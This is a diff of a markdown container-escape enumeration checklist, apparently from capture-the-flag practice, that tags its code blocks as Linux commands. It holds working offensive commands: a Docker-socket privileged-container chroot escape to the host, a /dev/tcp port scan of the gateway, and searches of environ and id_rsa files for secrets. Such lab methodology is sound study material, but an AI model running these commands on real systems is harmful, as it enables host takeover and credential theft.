@@ -14,6 +14,7 @@ This is the focused container-from-the-inside checklist. The full Linux post-foo
 
 Run all of these -- any positive is enough.
 
+<!-- cmd: linux -->
 ```bash
 ls /.dockerenv                              # exists on every Docker container
 ls /run/.containerenv                       # podman equivalent
@@ -31,6 +32,7 @@ Used on: **ohmyweb** (hostname `4a70924bafa0` -- a Docker short ID), **MonitorsF
 
 Capabilities are what separate "I'm in a sandbox" from "I'm basically root with some restrictions".
 
+<!-- cmd: linux -->
 ```bash
 cat /proc/self/status | grep -E '^Cap'
 # CapInh:  0000000000000000
@@ -42,6 +44,7 @@ cat /proc/self/status | grep -E '^Cap'
 Used on: **ohmyweb** (all zero -> daemon, no caps), **MonitorsFour**
 
 Decode any non-zero mask:
+<!-- cmd: linux -->
 ```bash
 capsh --decode=$(awk '/^CapEff/ {print $2}' /proc/self/status)
 # or, in a one-liner without capsh:
@@ -64,6 +67,7 @@ Container with `cap_dac_read_search` reads any file on the **container fs** -- c
 
 ## 3. Mounts -- Find the Host Filesystem
 
+<!-- cmd: linux -->
 ```bash
 mount
 cat /proc/mounts                            # read-only when /proc is hardened
@@ -91,12 +95,14 @@ The host's LVM device is named -- useful when chaining a privileged escape that 
 
 ## 4. The Docker Socket Check (One-Line Game Over)
 
+<!-- cmd: linux -->
 ```bash
 ls -la /var/run/docker.sock                 # if exists + writable -> game over
 curl --unix-socket /var/run/docker.sock http://x/version
 ```
 
 If the socket is mounted in (and we have `docker` installed or can drop a static `docker` binary), spawn a privileged container that bind-mounts host `/`:
+<!-- cmd: linux -->
 ```bash
 docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt --privileged alpine chroot /mnt sh
 ```
@@ -104,6 +110,7 @@ Full chain in [docker-api-unauthenticated.md](docker-api-unauthenticated.md) and
 
 ## 5. Network Reach
 
+<!-- cmd: linux -->
 ```bash
 ip a 2>/dev/null || ifconfig                # eth0 typically 172.17.0.X
 ip route 2>/dev/null || route -n            # default via 172.17.0.1 = host gateway
@@ -118,6 +125,7 @@ The standard map after this:
 - Sibling containers on `172.17.0.Y` (Y != X) reachable directly.
 
 Without `nmap`/`nc` installed, drop a static binary: see [container-network-pivoting.md](container-network-pivoting.md). Bash-only port check:
+<!-- cmd: linux -->
 ```bash
 for p in 22 80 2375 2376 5985 5986 8080 6443 10250; do
   (timeout 1 bash -c "echo >/dev/tcp/172.17.0.1/$p") 2>/dev/null && echo "open: $p"
@@ -136,6 +144,7 @@ Ports worth knowing:
 
 ## 6. Suspicious / Known-Useful Files
 
+<!-- cmd: linux -->
 ```bash
 ls -la /                                        # /host, /mnt, /data, etc.
 ls -la /root /home /opt /srv                    # mounted-in dev artefacts
@@ -149,6 +158,7 @@ cat /proc/self/environ | tr '\0' '\n'
 Used on: **ohmyweb** (the env grep, `find -name id_rsa`)
 
 Process tree -- look for the privileged sibling:
+<!-- cmd: linux -->
 ```bash
 ps -ef                                  # PID 1 in a container is your app, not init
 ps -eo pid,user,cmd                     # any root processes sidecars
@@ -159,6 +169,7 @@ cat /proc/*/cgroup 2>/dev/null | sort -u
 
 Run these only if you see signs you might be `--privileged`:
 
+<!-- cmd: linux -->
 ```bash
 # Block devices visible inside the container -> --privileged
 ls -la /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
